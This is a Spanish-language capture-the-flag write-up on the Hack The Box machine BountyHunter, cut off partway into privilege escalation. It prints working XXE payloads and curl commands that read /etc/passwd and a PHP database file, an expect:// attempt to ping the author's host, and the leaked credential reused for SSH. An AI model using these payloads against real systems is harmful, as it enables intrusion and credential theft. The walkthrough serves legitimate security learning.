<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BountyHunter (Hack The Box)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-20T20:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="BountyHunter (Hack The Box)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2021-11-20T20:00:00+01:00","datePublished":"2021-11-20T20:00:00+01:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.","headline":"BountyHunter (Hack The Box)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/"},"url":"https://j0lm3d0.github.io/posts/bountyhunter-(hack-the-box)/"}</script><title>BountyHunter (Hack The Box) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>BountyHunter (Hack The Box)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>BountyHunter (Hack The Box)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="20 Nov 2021, 20:00" >20 Nov 2021<i class="unloaded">2021-11-20T20:00:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2713 palabras">15 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_BountyHunter.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># nmap -p- --open -T5 -n -vv 10.10.11.100

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</pre></table></code></div></div><p>Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c"># nmap -p22,80 -sC -sV 10.10.11.100</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Bounty Hunters
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Como no cuento con credenciales para acceder a la máquina mediante el servicio SSH, comienzo enumerando el servidor web. Al acceder a la página principal, veo lo que se muestra en la siguiente imagen:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/indexpage.png" alt="Página principal del servidor web" /></p><p>Parece tratarse de una web personalizada que no utiliza ningún gestor de contenidos conocido, como Drupal o Wordpress. Al bajar un poco en la página principal, veo las secciones de “Contact” y “About”.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/aboutcontact.png" alt="Página principal del servidor web 2" /></p><p>Pero hay un apartado que aparece en la sección superior derecha y que no aparece en la página principal: “Portal”. Tras clicar en él, veo lo siguiente:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/portalpage.png" alt="Página &quot;portal&quot; del servidor web" /></p><p>Parece que el portal aún se encuentra en desarrollo y, en su lugar, ofrecen un enlace para probar un “Bounty Tracker”. Al acceder al enlace, observo el siguiente formulario:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/brspage.png" alt="Sistema de reportes del servidor web" /></p><p>Veo que se trata de una pequeña aplicación web en fase Beta que permite tener un registro de las recompensas que se han facilitado por descubrir algunas vulnerabilidades. Para añadir un nuevo registro nos pide: un título, el CWE, la puntuación de la vulnerabilidad (mide la criticidad de esta) y la recompensa pagada por ella. Relleno el formulario con datos de prueba y, antes de enviarlo, configuro el proxy para interceptar la petición con <code class="language-plaintext highlighter-rouge">BurpSuite</code>.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/burpintercept.png" alt="Petición interceptada del formulario del sistema de reportes" /></p><p>Al interceptar la petición, veo que existe una variable “data”, que contiene una estructura XML codificada en Base64. Viendo esto, ya pienso que esa estructura XML es interpretada por el servidor y puede ser vulnerable a un ataque XXE (XML External Entity). Para conocer más acerca de esta vulnerabilidad, se puede visitar la web oficial de <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">OWASP</a>. Por tanto, preparo una estructura XML maliciosa, que debería mostrar el contenido del fichero “/etc/passwd” del servidor en lugar del valor del campo “cwe”, y la codifico en Base64:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/preparingxxe.png" alt="Preparación de estructura XML maliciosa para ataque XXE" /></p><p>Una vez codificada la nueva estructura, vuelvo a interceptar una petición mediante <em>BurpSuite</em> y cambio el valor de “data” por el código en Base64 obtenido. Al enviar la petición modificada, se muestra en la página el contenido del fichero “/etc/passwd” correctamente, por lo que el ataque XXE ha funcionado correctamente.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/xxesuccess.png" alt="Éxito al realizar el ataque XXE" /></p><p>Con esto, descubro el usuario “development”, que no se trata de un usuario creado por el sistema o por algún servicio porque su identificador (UID) es superior a 1000. Al tener su directorio personal (/home/developer), intento obtener su clave privada RSA para el servicio SSH, que me permitiría conectarme a la máquina víctima como este usuario, pero, lamentablemente, esta clave no existe o no se encuentra en la ruta “/home/devoloper/.ssh/id_rsa”. También probé si contaba con ejecución remota de comandos utilizando el <em>wrapper</em> “expect” para lanzar un ping a mi máquina, pero, como puede observarse, no recibo ningún paquete, por lo que no es posible la ejecución de comandos por esta vía.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre># cat xxe.xml

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "expect://ping 10.10.14.214"&gt; ]&gt;
        &lt;bugreport&gt;
                &lt;title&gt;Proof&lt;/title&gt;
                &lt;cwe&gt;&amp;xxe;&lt;/cwe&gt;
                &lt;cvss&gt;9.4&lt;/cvss&gt;
                &lt;reward&gt;30&lt;/reward&gt;
        &lt;/bugreport&gt;

# cat xxe.xml | base64 -w 0

PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZXhwZWN0Oi8vcGluZyAxMC4xMC4xNC4yMTQiPiBdPgogICAgICAgIDxidWdyZXBvcnQ+CiAgICAgICAgICAgICAgICA8dGl0bGU+UHJvb2Y8L3RpdGxlPgogICAgICAgICAgICAgICAgPGN3ZT4meHhlOzwvY3dlPgogICAgICAgICAgICAgICAgPGN2c3M+OS40PC9jdnNzPgogICAgICAgICAgICAgICAgPHJld2FyZD4zMDwvcmV3YXJkPgogICAgICAgIDwvYnVncmVwb3J0Pgo=                                                                                                                                                                                                                                             
# curl --data-urlencode "data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZXhwZWN0Oi8vcGluZyAxMC4xMC4xNC4yMTQiPiBdPgogICAgICAgIDxidWdyZXBvcnQ+CiAgICAgICAgICAgICAgICA8dGl0bGU+UHJvb2Y8L3RpdGxlPgogICAgICAgICAgICAgICAgPGN3ZT4meHhlOzwvY3dlPgogICAgICAgICAgICAgICAgPGN2c3M+OS40PC9jdnNzPgogICAgICAgICAgICAgICAgPHJld2FyZD4zMDwvcmV3YXJkPgogICAgICAgIDwvYnVncmVwb3J0Pgo=" http://10.10.11.100/tracker_diRbPr00f314.php



(SECONDARY TERMINAL)
# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</pre></table></code></div></div><p>Al solo poder leer archivos, realizo una búsqueda mediante fuerza bruta de los ficheros y/o directorios que pudiesen estar ocultos en el servidor, para ver si así encuentro algún fichero de configuración o similar que pueda tener credenciales o información importante que me permita el acceso a la máquina.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -u http://10.10.11.100/

/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]   
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]      
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]       
/server-status        (Status: 403) [Size: 277]
</pre></table></code></div></div><p>Tras comprobar el contenido de los directorios descubiertos, veo un fichero “README.txt” en el directorio “resources”, cuyo contenido es el siguiente:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/BountyHunter/readme.png" alt="Fichero &quot;README&quot; en el directorio &quot;resources&quot; del servidor web" /></p><p>Se trata de una lista de tareas en las que vemos 2 tareas que se han realizado y 2 tareas que no:</p><ul><li>Se han corregido los permisos del grupo “developer” y se ha escrito el código para el “submit” del formulario del “Bounty Tracker”.<li>En la ruta “portal” no se ha deshabilitado el usuario “test”, no se ha deshabilitado la ausencia de contraseña y no se han pasado las contraseñas a formato hasheado. Además, no se ha conectado el “Bounty Tracker” a una base de datos (tal y como se veía en el mensaje que se mostraba al enviar el formulario).</ul><p>Pero estos datos no me aportan mucha información más de la que ya conocía, por lo que pruebo a hacer una búsqueda de ficheros en formato .html, .txt y .php.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x php,txt,html -u http://10.10.11.100/

/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
/index.php            (Status: 200) [Size: 25169]
/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]
/portal.php           (Status: 200) [Size: 125]
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]
/server-status        (Status: 403) [Size: 277]
</pre></table></code></div></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>En esta última búsqueda encuentro un archivo “db.php”, que podría tratarse de un fichero que realizase la conexión a la base de datos, conteniendo así las credenciales de acceso a esta en texto claro. Por tanto, intento leerlo aprovechando la vulnerabilidad XXE descubierta anteriormente.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre># cat xxe.xml

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///var/www/html/db.php"&gt; ]&gt;
        &lt;bugreport&gt;
                &lt;title&gt;Proof&lt;/title&gt;
                &lt;cwe&gt;&amp;xxe;&lt;/cwe&gt;
                &lt;cvss&gt;9.4&lt;/cvss&gt;
                &lt;reward&gt;30&lt;/reward&gt;
        &lt;/bugreport&gt;

# cat xxe.xml | base64 -w 0; echo

PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy92YXIvd3d3L2h0bWwvZGIucGhwIj4gXT4KICAgICAgICA8YnVncmVwb3J0PgogICAgICAgICAgICAgICAgPHRpdGxlPlByb29mPC90aXRsZT4KICAgICAgICAgICAgICAgIDxjd2U+Jnh4ZTs8L2N3ZT4KICAgICAgICAgICAgICAgIDxjdnNzPjkuNDwvY3Zzcz4KICAgICAgICAgICAgICAgIDxyZXdhcmQ+MzA8L3Jld2FyZD4KICAgICAgICA8L2J1Z3JlcG9ydD4K

# curl -s --data-urlencode "data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy92YXIvd3d3L2h0bWwvZGIucGhwIj4gXT4KICAgICAgICA8YnVncmVwb3J0PgogICAgICAgICAgICAgICAgPHRpdGxlPlByb29mPC90aXRsZT4KICAgICAgICAgICAgICAgIDxjd2U+Jnh4ZTs8L2N3ZT4KICAgICAgICAgICAgICAgIDxjdnNzPjkuNDwvY3Zzcz4KICAgICAgICAgICAgICAgIDxyZXdhcmQ+MzA8L3Jld2FyZD4KICAgICAgICA8L2J1Z3JlcG9ydD4K" http://10.10.11.100/tracker_diRbPr00f314.php

If DB were ready, would have added:
&lt;table&gt;
  &lt;tr&gt;
    &lt;td&gt;Title:&lt;/td&gt;
    &lt;td&gt;Proof&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CWE:&lt;/td&gt;
    &lt;td&gt;
&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Score:&lt;/td&gt;
    &lt;td&gt;9.4&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Reward:&lt;/td&gt;
    &lt;td&gt;30&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</pre></table></code></div></div><p>Tras no lograr que muestre el contenido del archivo, decido a probar con un wrapper de PHP que codifica el contenido de un fichero en Base64, pudiendo así ver su contenido tras descodificarlo.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre># cat xxe.xml

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"&gt; ]&gt;
        &lt;bugreport&gt;
                &lt;title&gt;Proof&lt;/title&gt;
                &lt;cwe&gt;&amp;xxe;&lt;/cwe&gt;
                &lt;cvss&gt;9.4&lt;/cvss&gt;
                &lt;reward&gt;30&lt;/reward&gt;
        &lt;/bugreport&gt;

# cat xxe.xml | base64 -w 0; echo

PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1kYi5waHAiPiBdPgogICAgICAgIDxidWdyZXBvcnQ+CiAgICAgICAgICAgICAgICA8dGl0bGU+UHJvb2Y8L3RpdGxlPgogICAgICAgICAgICAgICAgPGN3ZT4meHhlOzwvY3dlPgogICAgICAgICAgICAgICAgPGN2c3M+OS40PC9jdnNzPgogICAgICAgICAgICAgICAgPHJld2FyZD4zMDwvcmV3YXJkPgogICAgICAgIDwvYnVncmVwb3J0Pgo=

# curl -s --data-urlencode "data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1kYi5waHAiPiBdPgogICAgICAgIDxidWdyZXBvcnQ+CiAgICAgICAgICAgICAgICA8dGl0bGU+UHJvb2Y8L3RpdGxlPgogICAgICAgICAgICAgICAgPGN3ZT4meHhlOzwvY3dlPgogICAgICAgICAgICAgICAgPGN2c3M+OS40PC9jdnNzPgogICAgICAgICAgICAgICAgPHJld2FyZD4zMDwvcmV3YXJkPgogICAgICAgIDwvYnVncmVwb3J0Pgo=" http://10.10.11.100/tracker_diRbPr00f314.php

If DB were ready, would have added:
&lt;table&gt;
  &lt;tr&gt;
    &lt;td&gt;Title:&lt;/td&gt;
    &lt;td&gt;Proof&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CWE:&lt;/td&gt;
    &lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R
1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Score:&lt;/td&gt;
    &lt;td&gt;9.4&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Reward:&lt;/td&gt;
    &lt;td&gt;30&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

# echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
&lt;?php
// TODO -&gt; Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?&gt;
</pre></table></code></div></div><p>Gracias al uso del wrapper de codificación en Base64, logro ver el contenido del fichero de conexión a la base de datos, en el cual descubro el nombre de esta, y unas credenciales de acceso. Con esta información, pruebo si existe reutilización de credenciales conectándome por SSH como el usuario “development” proporcionando la contraseña “m19RoAU0hP41A1sTsq6K”. De esta forma, consigo acceder a la máquina víctima y visualizo la primera flag.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>development@bountyhunter:~$ cat user.txt
f2fbd988412b54f1e2537074227b03b2
</pre></table></code></div></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>En el directorio personal del usuario “development” encontramos un fichero: “contract.txt”, en el que un empleado indica a sus compañeros de trabajo que revisen una aplicación interna del cliente “Skytrain Inc” y que ha proporcionado los permisos necesarios para probarla.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>development@bountyhunter:~$ cat contract.txt

Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
</pre></table></code></div></div><p>Con el comando <em>sudo -l</em> compruebo si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar el archivo “ticketValidator.py”, que posiblemente se trate de la herramienta a la que se hacía referencia en el fichero de texto anterior, utilizando Python3.8 con privilegios de “root” y sin proporcionar contraseña.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</pre></table></code></div></div><p>El contenido de la herramienta de Python es el siguiente:</p><div lang="py" class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for ireggularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>
